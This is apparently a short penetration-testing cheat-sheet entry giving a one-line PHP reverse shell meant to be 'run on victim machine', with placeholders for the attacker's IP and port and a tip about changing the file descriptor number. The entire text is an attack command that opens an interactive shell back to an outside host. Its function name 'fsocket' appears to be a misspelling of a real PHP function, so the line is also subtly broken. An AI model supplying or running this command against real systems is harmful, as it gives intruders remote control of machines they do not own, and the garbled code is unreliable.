# php
## reverse shell one line (run on victim machine)
```
php -r '$socket=fsocket("$MY_IP",$MY_PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```
If there are errors try incrementing the 3 to a higher value